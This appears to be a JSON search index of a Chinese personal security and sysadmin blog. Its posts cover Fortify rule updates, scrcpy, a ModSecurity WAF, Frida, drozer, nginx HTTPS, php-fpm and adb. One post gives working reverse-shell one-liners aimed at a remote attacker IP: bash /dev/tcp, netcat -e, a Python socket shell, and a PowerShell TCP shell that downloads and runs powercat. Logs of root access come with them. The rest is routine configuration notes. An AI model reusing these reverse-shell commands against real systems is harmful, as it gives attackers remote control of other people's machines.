    "content"  : "最近在接触代码审计的活儿。碰到了一些问题，随手记录下来；错误描述：当fortify开始java代码分析时，报错Norulesfilesfound;1.错误描述谷歌一波关键词[error]:Norulesfilesfound：问题引出stackoverflow原问题：WhenIrunaFortifyanalysisagainstaJavaprojectIreceivethiserror:[warning]:Norulesfilesfound[error]:NorulesfilesfoundWherecanIconfiguretherulesfile?原答案：NavigatetothebinfolderofyourfortifyinstallationEnterscapostinstallEnter2toselectSettingsEnter2toselectProxyServerHostEnterthenameoftheproxyserverEnter3toselectProxyServerPort.Entertheproxyserver’sportnumber.Exitandrunfortifyupdate.cmd原答案的意思就是说需要对fortify进行代理配置，(需科学上网)后进行规则库的下载配置。2.解决问题配置代码进入fortify安装的目录，对fortify进行代理配置，配置过程代码如下：#进入fortify的安装目录(windows环境)E:cdfortify\\bin\\E:\\fortify\\bin&gt;scapostinstall[1]Migration...[2]Settings...[s]Displayallsettings[q]ExitPleaseselectthedesiredaction(1,2,s,q):2[1]General...[2]FortifyUpdate...[3]SoftwareSecurityCenterSettings...[s]Displayallsettings[r]Return[q]ExitPleaseselectthedesiredaction(1,2,3,s,r,q):2[1]UpdateServerURL[2]ProxyServerHost[3]ProxyServerPort[4]ProxyServerUsername[5]ProxyServerPassword[s]Displayallsettings[r]Return[q]ExitPleaseselectthedesiredaction(1,2,3,4,5,s,r,q):2ProxyServerHost[default:]:localhost[1]UpdateServerURL[2]ProxyServerHost[3]ProxyServerPort[4]ProxyServerUsername[5]ProxyServerPassword[s]Displayallsettings[r]Return[q]ExitPleaseselectthedesiredaction(1,2,3,4,5,s,r,q):3ProxyServerPort[default:]:8080[1]UpdateServerURL[2]ProxyServerHost[3]ProxyServerPort[4]ProxyServerUsername[5]ProxyServerPassword[s]Displayallsettings[r]Return[q]ExitPleaseselectthedesiredaction(1,2,3,4,5,s,r,q):q以上fortify客户端配置代理结束，然后直接输入命令进行规则库下载更新：更新文件输入fortifyupdate更新命令，更新代码如下：E:\\fortify\\bin&gt;fortifyupdate.cmdUsingproxyserver:localhost:8080StoringUpdatedSecurityContent...E:\\fortify\\Core\\config\\rulesFortifySecureCodingRules,Core,Annotationsv2015.2.0.0008FortifySecureCodingRules,Extended,JSPv2015.2.0.0008FortifySecureCodingRules,Core,ClassicASP,VBScript,andVB6v2015.2.0.0008FortifySecureCodingRules,Core,ActionScript3.0v2015.2.0.0008FortifySecureCodingRules,Core,C/C++v2015.2.0.0008FortifySecureCodingRules,Extended,Javav2015.2.0.0008FortifySecureCodingRules,Core,Androidv2015.2.0.0008FortifySecureCodingRules,Core,COBOLv2015.2.0.0008FortifySecureCodingRules,Extended,C/C++v2015.2.0.0008FortifySecureCodingRules,Core,.NETv2015.2.0.0008FortifySecureCodingRules,CorePreview,ABAPv2014.4.0.0008FortifySecureCodingRules,Extended,Configurationv2015.2.0.0008FortifySecureCodingRules,Extended,Contentv2015.2.0.0008FortifySecureCodingRules,Core,Objective-Cv2015.2.0.0008FortifySecureCodingRules,Core,PHPv2015.2.0.0008FortifySecureCodingRules,Core,ABAPv2015.2.0.0008FortifySecureCodingRules,Extended,SQLv2015.2.0.0008FortifySecureCodingRules,Core,JavaScriptv2015.2.0.0008FortifySecureCodingRules,Core,SQLv2015.2.0.0008FortifySecureCodingRules,Extended,.NETv2015.2.0.0008FortifySecureCodingRules,Core,Javav2015.2.0.0008FortifySecureCodingRules,Core,Rubyv2015.2.0.0008FortifySecureCodingRules,Core,ColdFusionv2015.2.0.0008FortifySecureCodingRules,Core,Pythonv2015.2.0.0008RemovingOldMetadataFiles...E:\\fortify\\Core\\config\\ExternalMetadataMainExternalListMappingsv2019.1.0.0007StoringUpdatedMetadataFiles...E:\\fortify\\Core\\config\\ExternalMetadataMainExternalListMappingsv2015.2.0.0008结果配置完就可以愉快地使用fortify进行机器扫描分析代码了。敬上。感谢您的阅读参考：FortifyError:“Norulesfilefound”"
  },

  {
    "title"    : "「scrcpy」:Linux中优秀的投屏软件～",
    "category" : "",
    "tags"     : "笔记",
    "url"      : "/blog/2019/scrcpy-android-in-linux/",
    "date"     : "Dec 31, 2019",
    "content"  : "macOS2022/03/30/17:13:08添加macOS用法用scrcpy主要是因为开源且干净，先上效果图。安装也很简单：brewinstallscrcpy不过当时我一直报错：Error:python@3.9:thebottleneedstheAppleCommandLineToolstobeinstalled.Error:scrcpy:Failedtodownloadresource\"imath\"来回的报错，而且brew的cache下载文件夹一直在下载，我就很慌；然后在知乎上找到@知乎用户的回答：mac用户使用homebrew安装scrcpy时，请注意如果使用了国内源，则有可能安装不到scrcpy的最新版本（目前是v1.14），如果安装了旧版本，则某些手机可能无法使用scrcpy，报segementerror。所以，请确保能安装到最新版本的scrcpy：1、使用默认源；2、使用地址直接安装特定版本；3、安装完成后，使用brewinfoscrcpy，确认一下版本。豁然开朗；直接修改默认源在下载就好了：git-C\"$(brew--repo)\"remoteset-urlorigin'https://github.com/Homebrew/brew.git'git-C\"$(brew--repohomebrew/core)\"remoteset-urlorigin'https://github.com/Homebrew/homebrew-core.git'git-C\"$(brew--repohomebrew/cask)\"remoteset-urlorigin'https://github.com/Homebrew/homebrew-cask.git'brewupdateinfo:$brewinfoscrcpyscrcpy:stable1.23(bottled)DisplayandcontrolyourAndroiddevicehttps://github.com/Genymobile/scrcpy/usr/local/Cellar/scrcpy/1.23(10files,295.9KB)*Pouredfrombottleon2022-03-30at16:51:20From:https://github.com/Homebrew/homebrew-core/blob/HEAD/Formula/scrcpy.rbLicense:Apache-2.0Linux#aptinstallsnapd正在读取软件包列表...完成正在分析软件包的依赖关系树正在读取状态信息...完成snapd已经是最新版(2.42.1-1)。升级了0个软件包，新安装了0个软件包，要卸载0个软件包，有26个软件包未被升级sudosnapinstallscrcpy.snap--dangerous由于直接设置http_proxy环境变量无法设置上,作者在snapd中直接设置proxy,方法如下:#前置操作,修改systemctledit使用的编辑器为VIM,如果不介意Nano可以跳过这一步$sudotee-a/etc/profile&lt;&lt;-'EOF'exportSYSTEMD_EDITOR=\"/bin/vim\"EOF$source/etc/profile#开始设置代理$sudosystemctleditsnapd#加上：[Service]Environment=\"http_proxy=http://127.0.0.1:port\"Environment=\"https_proxy=http://127.0.0.1:port\"$sudosystemctldaemon-reload$sudosystemctlrestartsnapd实测相当有效root@kali:/usr/local/scrcpy-test/scrcpy#sudosnapinstallscrcpy2019-12-31T11:28:41+08:00INFOWaitingforrestart...Downloadsnap\"core18\"(1288)fromchannel\"stable\"11%14.7kB/s57.7m^C^C^Z[2]+已停止sudosnapinstallscrcpy如上下所示，速度快了十倍～十倍的快乐～root@kali:/usr/local/scrcpy-test/scrcpy#sudosnapinstallscrcpy2019-12-31T11:36:30+08:00INFOWaitingforrestart...Downloadsnap\"scrcpy\"(199)fromchannel\"stable\"7%129kB/s9m51sWarning:/snap/binwasnotfoundinyour$PATH.Ifyou'venotrestartedyoursessionsinceyouinstalledsnapd,trydoingthat.Pleaseseehttps://forum.snapcraft.io/t/9469formoredetails.scrcpyv1.12fromsisco311installedscrcpy投屏需要usb调试权限；具体步骤为[开发者模式]-[打开usb调试]否则会报错：root@kali:~#scrcpyINFO:scrcpy1.12&lt;https://github.com/Genymobile/scrcpy&gt;adb:error:failedtogetfeatureset:nodevices/emulatorsfoundERROR:\"adbpush\"returnedwithvalue10x01其他报错root@kali:/snap/bin#./scrcpycannotchangeprofileforthenextexeccall:Nosuchfileordirectorysnap-update-nsfailedwithcode1:Nosuchfileordirectory#查看版本：root@kali:~#snapversionsnap2.42.5snapd2.42.5series16kali2019.4kernel5.3.0-kali3-amd64root@kali:~#snapversionsnap2.42.5snapd2.42.5series16kali2019.4kernel5.3.0-kali3-amd64解决：root@kali:/var/lib/snapd/apparmor/profiles#apparmor_parser-r/var/lib/snapd/apparmor/profiles/参考snapInstall.md;snap安装过慢解决方案Snap-update-nsfailing,cannotlaunchsnaps;linux重启后启动scrcpy，snap报错@知乎用户Homebrew查看并修改源配置"
  },

  {
    "title"    : "「笔记」：反弹shell的几种方法",
    "category" : "",
    "tags"     : "安全工具, 渗透, 笔记",
    "url"      : "/blog/2019/shell-reserve-back/",
    "date"     : "Dec 30, 2019",
    "content"  : "记录：关于bashshell的反弹:)随笔记假定环境：kali被攻击机器；ip:192.168.3.32iZj6cgn7odv59wmjjhe6zwZ攻击机；ip:47.52.233.921.bashroot@kali:/#bash-i&gt;&amp;/dev/tcp/47.52.233.92/12340&gt;&amp;1root@iZj6cgn7odv59wmjjhe6zwZ:~#nc-lvvp1234Listeningon[0.0.0.0](family0,port1234)Connectionfrom223.240.212.23637798received!root@kali:/#whoamiwhoamirootroot@kali:/#ifconfigifconfigeth0:flags=4099&lt;UP,BROADCAST,MULTICAST&gt;mtu1500ether1c:39:47:e5:d0:0dtxqueuelen1000(Ethernet)RXpackets0bytes0(0.0B)RXerrors0dropped0overruns0frame0TXpackets0bytes0(0.0B)TXerrors0dropped0overruns0carrier0collisions0lo:flags=73&lt;UP,LOOPBACK,RUNNING&gt;mtu65536inet127.0.0.1netmask255.0.0.0inet6::1prefixlen128scopeid0x10&lt;host&gt;looptxqueuelen1000(LocalLoopback)RXpackets132196bytes121378334(115.7MiB)RXerrors0dropped0overruns0frame0TXpackets132196bytes121378334(115.7MiB)TXerrors0dropped0overruns0carrier0collisions0wlan0:flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;mtu1500inet192.168.3.32netmask255.255.255.0broadcast192.168.3.255inet6fe80::c895:5ca5:529a:eef3prefixlen64scopeid0x20&lt;link&gt;ether68:07:15:d5:46:16txqueuelen1000(Ethernet)RXpackets140963bytes101469044(96.7MiB)RXerrors0dropped15overruns0frame0TXpackets86373bytes16895892(16.1MiB)TXerrors0dropped0overruns0carrier0collisions02.netcatroot@kali:/#nc-e/bin/sh47.52.233.921234root@iZj6cgn7odv59wmjjhe6zwZ:~#nc-lvvp1234Listeningon[0.0.0.0](family0,port1234)Connectionfrom223.240.212.23637812received!python-c'importpty;pty.spawn(\"/bin/sh\")'#whoamiwhoamiroot#3.pythonroot@kali:/#python-c'importsocket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"47.52.233.92\",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'root@iZj6cgn7odv59wmjjhe6zwZ:~#nc-lvvp1234Listeningon[0.0.0.0](family0,port1234)Connectionfrom223.240.212.23637820received!#whoamiroot#iduid=0(root)gid=0(root)组=0(root)4.powershell构造函数反弹shell实际反弹shell中成功的；应用场景：1.WINDOWS系统2.上传木马成功，但是没有交互式shellpowershell.exe-nop-c\"$client=New-ObjectNet.Sockets.TCPClient('117.64.238.192',11223);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne0){;$data=(New-Object-TypeNameSystem.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex$data2&gt;&amp;1|Out-String);$sendback2=$sendback+'PS'+(pwd).Path+'&gt;';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"powershellIEX(New-ObjectSystem.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat-c47.52.233.92-p11223-ecmdmeterpreter可以直接开启rungetui-e然后用rdesktop就能直接连了"
  },

  {
    "title"    : "Mod-Security：有关「WAF」的爱恨情仇",
    "category" : "",
    "tags"     : "笔记, Web, WAF",
    "url"      : "/blog/2019/modsec-test/",
    "date"     : "Dec 25, 2019",
    "content"  : "添加于2021/02/05“朝花夕拾”这篇与WAF相关《技术》博客其实没有多少技术含量，只是当时刚刚接触到WAF，感觉非常的新鲜然后有了这篇博客，其实当时连LINUX基础常识都还不是非常的了解，年少轻狂的来配置WAF肯定无法成功；现在回头来看当时的文笔还是较为稚嫩，通篇都是一些”转述”的代码块，没有自己的相关思想，是很糟糕的一篇博客。刚好年底总结博客，总结到WAF这一块，正好把这一篇的文章给补上，整理文章可以查看，较于下面这篇文章，主要增加了自定义规则库的配置和相关验证，可通过上方目录链接直接跳转：「分享」ModsecWAF：老牌开源waf的绕过历程正好把这篇文章收个尾，我的有些文章写到一半，写不下去了就放着了。这个习惯不是很好。记一次waf配置经历。忙里偷闲，正好有闲置的服务器，自己动动手配置看看。于2022-10-20修改1.运行环境nginx-1.14.0（apt自动化安装）经过实际操作验证，这里建议各位使用nginx1.13.8版本；源码包下载链接wgethttp://nginx.org/download/nginx-1.13.8.tar.gzubuntu18.042.安装配置安装的过程大致是这样的一个过程：1、ModWAF编译安装nginx版本，教程中推荐的1.9版本实际操作下来无法成功在UBUNTU18下编译安装，这里推荐nginx/1.13.8或者更高，极力推荐nginx/1.18.0wgethttp://nginx.org/download/nginx-1.13.8.tar.gz环境lib库安装：sudoapt-getinstallopenssllibssl-devlibpcre3libpcre3-devzlib1g-devautoconfautomakelibtoolgccg++makegitclonehttps://github.com/SpiderLabs/ModSecurity2、编译安装NGINX注意编译安装时添加nginx连接器：gitclonehttps://github.com/SpiderLabs/ModSecurity-nginx.gitmodsecurity-nginx./configure--add-module=/path/to/modsecurity-nginxNGINXWEBSERVER块配置：server{listen8077;location/{default_typetext/plain;return200\"Thankyouforrequesting${request_uri}\\n\";}}效果图：3、防护规则自写并测试：下载ModSecurity配置文件，我的NGINX目录在/usr/local/nginx下，所以我的命令如下；cd/usr/local/nginx&amp;&amp;mkdirmodsec&amp;&amp;cdmodsecwgethttps://raw.githubusercontent.com/SpiderLabs/ModSecurity/v3/master/modsecurity.conf-recommendedmvmodsecurity.conf-recommendedmodsecurity.confvimmodsecurity.conf#修改SecRuleEngineDetectionOnly为SecRuleEngineOn#同样，添加配置：vimmain.conf#内容为：Include/usr/local/nginx/modsec/modsecurity.confSecRuleARGS:url\"@containsadmin\"\"id:2234,deny,log,status:403\"#在访问url内传输给url这个参数中存在admin字样进行拦截，并记录。报错：报错解决：[emerg]\"modsecurity_rules_file\"directiveRuleserror.vim/etc/nginx/modsec/modsecurity.conf注释掉下面配置语句#SecUnicodeMapFileunicode.mapping20127配置成功SERVER区块：server{listen8077;server_namelocalhost;modsecurityon;modsecurity_rules_file/usr/local/nginx/modsec/main.conf;#charsetkoi8-r;#access_loglogs/host.access.logmain;location/{roothtml;default_typetext/plain;return200\"Thankyouforrequesting${request_uri}\\n\";#indexindex.htmlindex.htm;proxy_set_headerHost$host;}error_page404403405/403.html;location=/403.html{root/usr/local/nginx/html/403;}WAF防护效果图（这里当时环境的图搞丢了，随便找了一张意思一下）：如无法测试成功可参考以下链接：《手把手带你搭建企业级WEB防火墙ModSecurity3.0+Nginx》《ModSecurity：一款优秀的开源WAF》添加于2021/02/053.规则库配置我们从上面得到：main.conf配置文件自写规则库：当然也可以发散思维，禁止参数传入/etc/passwd等，此处权当抛砖引玉测试：Include/usr/local/nginx/modsec/modsecurity.confSecRuleARGS:url\"@containsadmin\"\"id:2234,deny,log,status:403\"#在访问url内传输给url这个参数中存在admin字样进行拦截，并记录。我们在安全开发的过程中若需要自写规则库进行WEB防御，可参考：效果图：参考：ModSecurity中文手册4.总结原文大量篇幅写的是代码的配置问题，后期修改后删除了大部分，有兴趣的可以看上面的第二个链接；这一块，其实跟着原教程走了一个弯，这里原作者在教程中应用的是反向代理，我们可以通过以上成功的SERVER配置块了解到其实直接链接WAF让规则库生效即可。以上。"
  },

  {
    "title"    : "「安卓渗透」:Amazing drozer Scanning frame",
    "category" : "",
    "tags"     : "笔记, Android Reverse, 渗透",
    "url"      : "/blog/2019/android-drozer-scan/",
    "date"     : "Dec 18, 2019",
    "content"  : "直接上链接，不多bb。有空写实战：）参考文档：安卓渗透框架－Drozer架构浅析–架构组成和自定义模块一、drozer运行概述跟Frida-Hook框架运行模式差不多，均为C/S模式。1）移动端：drozer-agent启动pc-drozer框架前需打开drozer-agent进行端口转发2）pc端：主要控制CLI端。渗透测试命令全部在这里输入执行；1.1drozer环境windows/linux-debianpython2.7drozer&amp;drozer-angent1.2前期准备windows-drozer-2.4.4.msi下载debian-linux-drozer-2.4.4.deb下载android-drozer-2.3.4.apk下载多提一句：msi后缀为windows可执行文件，双击安装即可。deb：dpkg-i&lt;deb包&gt;apk是安卓包，下载到本地&lt;adbinstallapk包&gt;二、drozer实战C:\\Users\\本阿信&gt;drozerconsoleconnectSelecting7ad839637216ad27(OPPOOPPOR11Plus5.1.1)....:...o...r....a.............ndro..idsnemesisand..pr.otectorandroidsneme..,sisandprotectorandroids+...nemesisandprotectorandroidsn:..emesisandprotectorandroidsnemes....isandp,..,rotectorandro,..,idsnem..isisandp..rotectorandroid..snemisis.,andprotectorandroidsnemisisandprotec..torandroidsnemesisandprotectorandroid..snemisisandprotectorandroidsnemesisan:.dprotectorandroidsnemesisandprotector.drozerConsole(v2.4.4)dz&gt;updating～"
  },

  {
    "title"    : "「安卓渗透」： Let&#39;s hook APK with frida～",
    "category" : "",
    "tags"     : "笔记, Android Reverse, 渗透",
    "url"      : "/blog/2019/android-hook/",
    "date"     : "Dec 15, 2019",
    "content"  : "忙里偷闲，本文是记录Hook-Frida框架，如何使用Frida注入代码，做到对安卓apk进行代码hook注入。Frida框架准备1.frida框架安装frida框架为C/S模式，即客户端、服务端模式：1）一部分是运行在客户端上的命令行交互工具：FridaCLI。2）另一部分是运行在目标机器（服务端，在本文中则是安卓手机）上的代码注入：frida-server。过程为：你在电脑上进行frida控制，开启目标机器（服务端）上的server端后，我们可以一些自定义操作比如指定hook脚本，这些参数通过客户端发送到服务端，服务端接收参数后来进行操作2.一个测试apk3.hook代码(此处hook代码不便贴出，见谅)安装Frida这里Frida支持python3和python2.7，因为确实3和2.7之间还是有不同的地方，本文以python2.7安装Frida为例：查看pip版本pip--versionpip18.1from/usr/lib/python2.7/dist-packages/pip(python2.7)##你想在哪个环境下运行Frida，就用哪个命令（pip、pip3）pip3--versionpip18.1from/usr/lib/python3/dist-packages/pip(python3.7)确认是在2.7版本环境下安装即可：pipinstallfridaCollectingfridaDownloadinghttps://files.pythonhosted.org/packages/38/1b/8a462787cedda36c57227ed0babbd80c4c4cc5bc9c1f9b5aa285ed6aebba/frida-12.8.0.tar.gzBuildingwheelsforcollectedpackages:fridaRunningsetup.pybdist_wheelforfrida...\\SuccessfullybuiltfridaInstallingcollectedpackages:fridaSuccessfullyinstalledfrida-12.8.0安装完frida，继续安装依赖项：frida-tools：pipinstallfrida-tools\t100%|████████████████████████████████|348k此处基本frida框架就安装完成了，查看一下frida的版本号frida--version12.8.0安装frida-server此处安装的是Frida的服务端，在手机端运行。手机端大多为ARM架构，但有的小伙伴使用的模拟器，所以先用命令查看一下手机的cpu架构：adbshell*daemonnotrunning;startingnowattcp:5037*daemonstartedsuccessfullyshell@angler:/$suroot@angler:/#getpropro.product.cpu.abiarm64-v8a如果回显是arm就下载arm版本，回显x86就下载x86版本。frida-server下载这里记住千万不要下载错了，进去页面直接CTRL+F搜索server。下载完毕，重命名为frida-server把frida-server传输到手机，（注意：pc端frida版本号与移动端一致）：##PC端adbdevicesadbpushfrida-server/data/local/tmpadbforwardtcp:27042tcp:27042adbforwardtcp:27043tcp:27043##移动端adbshellroot@angler:/data/local/tmp#cd/data/local/tmp/root@angler:/data/local/tmp#./frida-serverFrida-Hook实战在启动服务端frida-server后，在客户端进行操作：##指定好pack包和js文件路径frida-U-f&lt;package-name&gt;-l&lt;hook.js-path&gt;##提示&lt;package-name&gt;Spawned成功后，输入%resume重启app后使app-hook注入如下图，app重启后检测到hook框架代码弹出提示，此时js代码注入成功。参考文档：Frida详细安装教程"
  },

  {
    "title"    : "NGINX笔记：http升级https协议",
    "category" : "",
    "tags"     : "Web, 排错, 笔记",
    "url"      : "/blog/2019/nginx-http2https/",
    "date"     : "Dec 7, 2019",
    "content"  : "窈窕HTTPS，正是TCP的好逑；howtousedhttptohttpswithnginx?Is’ssoundsfantastic!其实证书早就颁发下来了，一直配置配不成功（小声bb）。纪念一下，2019-12-13号，站点升级为https协议。嘿嘿1.安装libssl库sudoapt-getinstalllibssl-devapt-getinstalllibpcre3libpcre3-dev2.ssl编译cdnginx/./configure--prefix=/usr/local/nginx--with-http_stub_status_module--with-http_ssl_module--with-file-aio--with-http_realip_modulemake如果安装了nginx，到这里结束。反之再加makeinstallcd#你解压nginx的目录/sbin/./nginx-Vnginx-V#注意是大v，看到下面有--with-http_ssl_module模块即可nginxversion:nginx/1.16.1builtwithOpenSSL1.1.1d10Sep2019TLSSNIsupportenabledconfigurearguments:--with-cc-opt='-g-O2--with-http_ssl_modulecpnginx/usr/sbin复制到快速启动目录即可3.认证配置证书申请下来后把证书传到服务器上就行了，配置nginx的https区块即可。http{server{listen443;server_nameXXX;sslon;ssl_certificate/usr/local/nginx/conf/cert/214.pem;#你自己的证书地址ssl_certificate_key/usr/local/nginx/conf/cert/21.key;ssl_session_timeout5m;ssl_ciphersECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;ssl_protocolsTLSv1TLSv1.1TLSv1.2;ssl_prefer_server_cipherson;location/{\t}\t}}nginx-tsystemctlreloadnginxAMAZING:it’sfailed配置完美滋滋去验证网站，畏（zhi）畏（gao）缩（qi）缩（ang）的输入站点https协议地址，结果傻了眼，还是http的协议提示，好气。赶紧趁着ssh还没断开赶紧查看配置哪里出了问题。思路：因为配置了ssl，监听了443端口。所以服务器肯定在监听了443端口，先查查看：netstatus-tunlp|grep443#发现没有回显，那看看所有监听服务器netstatus-tunlp#（仅仅展示一部分）发现服务器并未监听443ActiveInternetconnections(onlyservers)ProtoRecv-QSend-QLocalAddressForeignAddressStatePID/Programnametcp000.0.0.0:800.0.0.0:*LISTEN861/nginx:masterptcp00127.0.0.53:530.0.0.0:*LISTEN319/systemd-resolvetcp000.0.0.0:220.0.0.0:*LISTEN6029/sshd如上代码，nginx配置了监听443,，实际上linux却没有监听，问题肯定就出在这上面首先排除：nginx配置问题，因为nginx配置是能够通过的，所以暂时排除。第二就是防火墙的问题，先登上控制台确认443端口开放，没问题。然后登上服务器查看服务器防火墙状态，因为是ubuntu服务器所有查看ufw状态：systemctlstatusufw●ufw.service-UncomplicatedfirewallLoaded:loaded(/lib/systemd/system/ufw.service;enabled;vendorpreset:enabled)Active:active(exited)sinceFri2019-12-1310:46:00CST;1h54minagoDocs:man:ufw(8)Process:31826ExecStop=/lib/ufw/ufw-initstop(code=exited,status=0/SUCCESS)Process:31967ExecStart=/lib/ufw/ufw-initstartquiet(code=exited,status=0/SUCCESS)MainPID:31967(code=exited,status=0/SUCCESS)Dec1310:46:00iZj6cgn7odv59wmjjhe6zwZsystemd[1]:StartingUncomplicatedfirewall...Dec1310:46:00iZj6cgn7odv59wmjjhe6zwZsystemd[1]:StartedUncomplicatedfirewall.看到服务器防火墙是active状态，但是接下来却让我目瞪口呆：ufwstatusverboseStatus:inactiveufwstatusnumberedStatus:inactive不管怎么写命令，他都是提示incative，我瞬间就崩溃了，我甚至还尝试了systemctlstatusverboseufw这样的蠢命令--|||后来各种查命令，因为我坚信服务器上还有第二个防火墙～理由：控制台开放了443，而我进行验证却验证失败：telnegt$IP443反馈：telnet:Unabletoconnecttoremotehost:Connectionrefused，所以我就一直钻到防火墙的牛角尖出不来了。兜兜转转，圈圈圆圆。所以就一直拖到了今天TATItcanbesolved.后来证实其实问题不是在防火墙上，今天偶然网上冲浪，看到个帖子:nginxhttps配置后无法访问，可能防火墙在捣鬼(建议右键新建页面打开～笔芯)，引用文章的话:如果无法连接，通常是防火墙，或者nginx为(未)(我真是个天才)启动等可能的因素；冷静分析问题，查看错误信息，才是解决问题的办法联想到我的问题，难道？是nginx根本没有重启？一语惊醒梦中人。赶紧登上服务器。既然systemctl没用，那直接用nginx配置命令nginx-sreload输入chihou.pro-键入F5她居然跳转了https页面，我哭了。冷静分析问题，查看错误信息，才是解决问题的办法解决问题的办法办法法奥利给～给...如果这篇文章帮助到了您，那不如在心里大大喊一声nice～敬上。感谢您的阅读参考：启动Nginx出现Failedtostartnginx.service:unitnotfoundUbuntu编译安装nginxnginx动态添加ssl模块"
  },

  {
    "title"    : "「排错」：php-fpm解析404-not found",
    "category" : "",
    "tags"     : "Web, 笔记, 技巧, 排错",
    "url"      : "/blog/2019/php-with-nginx-error/",
    "date"     : "Dec 4, 2019",
    "content"  : "php+nginx解析错误，报错404-NotFound前言容器内是自己写的个人博客，处于安全考虑用的是静态页面博客。但是由于公网维护博客较为困难，加上之前用的开源存储云服务项目，那么就需要php来解析，所以打算试一试能不能「nginx+php」的方式方便个人维护博客。所以本菜最终想完成的是这样的：statichtml：webblog+dynamicphp：storeserver静态博客页面+动态php页面传输markdown文件报错现象nginx容器能够启动，HTML页面能够正常回显，但是解析php页面会报错：404-NOT-FOUND；viindex.php&lt;?phpphpinfo();?&gt;看到比我头还大的404头就疼；确定各种php的配置都没错。server{location~\\.php{\tindexindx.phpindex.html;\tincludesnippets/fastcgi-php.conf;\tfastcgi_passunix:/var/run/php/php7.2-fpm.sock;\t\t}}就各种上网搜php-404，问人。都没答案。排错过程幡然悔悟正好最近薅了一个华为云服务器，反手就是nginx+php存储项目往上安装方便传输文件，配nginx的时候看到这么一行配置：###VirtualHostConfigs##\tinclude/etc/nginx/conf.d/*.conf;\tinclude/etc/nginx/sites-enabled/*;直拍大腿，当初配博客服务器的时候，嫌麻烦，直接把/etc/nginx/sites-enabled/这行配置注释掉了，自己在http区块配了php-location-server。赶紧重新配置php-fpm：传送门：「移植」ubuntuwitharm.公网存储容器搭建记录茅塞顿开重新软链接完php-fpm，迫不及待访问php文件，又报错：502：Bad-Gateway舒了一口气，总算不是该死的404了。502报错基本上就是php-fpm的配置问题了，一般都是fpm在解析时出错。反手查看一波php运行日志：cat/var/log/php7.2-fpm.log[04-Dec-201917:58:14]NOTICE:readytohandleconnections[04-Dec-201917:58:14]NOTICE:systemdmonitorintervalsetto10000ms果然，php-fpm解析超时了导致报错，直接搜索解决答案；迎刃而解在php-fpm配置文件下加入fpm运行参数:vi/etc/php/7.2/fpm/php-fpm.conf;;;;;;;;;;;;;;;;;;;GlobalOptions;;;;;;;;;;;;;;;;;;;pm.max_children=50pm.start_servers=15pm.min_spare_servers=10pm.max_spare_servers=40systemctlreloadphp-fpm同时对nginx增加配置：vi/etc/nginx/nginx.confhttp{fastcgi_connect_timeout300;fastcgi_send_timeout300;fastcgi_read_timeout300;}nginx-tnginx:theconfigurationfile/etc/nginx/nginx.confsyntaxisoknginx:configurationfile/etc/nginx/nginx.conftestissuccessful测试无误访问index.php，终于看到了熟悉的phpinfo页面，至此排错、配置结束。2020-02-20更新：在linux下配置好nginx和php-fpm后，访问web页面不能显示，查看nginx访问日志，日志显示返回200，访问成功。html静态页面没问题，但是php页面总是空白页也没有任何报错，经过查找，发现需要在nginx中加入一句话fastcgi_paramSCRIPT_FILENAME$document_root$fastcgi_script_name;安装完nginx后默认的fastcgi_params配置文件中没有上面这句话。在nginx.conf中的location~.php${roothtml;fastcgi_pass127.0.0.1:9000;fastcgi_indexindex.php;#fastcgi_paramSCRIPT_FILENAME/scripts$fastcgi_script_name;fastcgi_paramSCRIPT_FILENAME$document_root$fastcgi_script_name;includefastcgi_params;}或者在fastcgi_params配置文件中加入#PHPonly,requiredifPHPwasbuiltwith–enable-force-cgi-redirectfastcgi_paramREDIRECT_STATUS200;fastcgi_paramSCRIPT_FILENAME$document_root$fastcgi_script_name;然后重启nginx就可以显示出页面了。nginx下运行php文件时返回200访问空白页#502badgateway:apt自动化安装：配置/etc/php/7.3/fpm/pool.d/www.conf文件：php-fpm.conf:listen=127.0.0.1:9000nginx.conf:fastcgi_pass127.0.0.1:9000;php502badgateway解决方法：以上。"
  },

  {
    "title"    : "「安卓渗透」：天之骄子ADB",
    "category" : "",
    "tags"     : "笔记, 渗透, Android Reverse",
    "url"      : "/blog/2019/android-debug-brige/",
    "date"     : "Nov 30, 2019",
    "content"  : "adb简介adb（AndroidDebugBridge）Android调试桥是一种功能多样的命令行工具，可让设备之间（PC端和移动端）进行通信。adb命令便于执行各种设备操作（例如安装和调试应用），并提供对UnixShell（可用来在设备上运行各种命令）的访问权限。它是一种客户端-服务器程序。一、adb连接本菜使用的是模拟器，不同模拟器端口不一样。比如谷歌模拟器端口则默认为5555;$adbconnect127.0.0.1:21503adbserverisoutofdate.killing...*daemonstartedsuccessfully*connectedto127.0.0.1:21503$adbdevicesListofdevicesattached127.0.0.1:21503device二、adb常使用命令Linux下的命令就不多说了;直接看adb的常用命令(在pc端控制台查看、使用)AndroidDebugBridgeversion1.0.32devicecommands:1.adbpush顾名思义，push，推送：在pc端控制台将pc端的文件(夹)push到移动端，用法实例：$adbpushinject/data/local1606KB/s(17936bytesin0.010s)进入安卓手机验证:root@SM-G9350:/data/local#lsgdbinjecttmp如上所示inject文件被push到安卓机中。2.adbpull与push相反在pc端控制台将移动端的文件(夹)pull到pc端。$adbpull/data/local/injectC:\\Users\\本阿信2507KB/s(17936bytesin0.006s)在pull文件夹控制台验证:$dir驱动器C中的卷是root卷的序列号是0009-A6D5C:\\Users\\本阿信的目录（此下DIR为尖括号，会将文本格式闭合，所以换成括号）2019/11/3022:25（DIR）.2019/11/3022:25（DIR）..2019/11/2817:15（DIR）.android2019/11/2817:44（DIR）.idlerc2019/11/3022:03（DIR）.MemuHyperv2019/10/1622:05（DIR）.ssh2019/11/3022:2517,936inject如上所示inject文件已经被pull到pc端了。3.adbshell打开进入已连接安卓机的shell;adb提示已经连接上了安卓手机，直接进入系统。$adbshellroot@SM-G9350:/#whoamirootroot@SM-G9350:/#pwd/root@SM-G9350: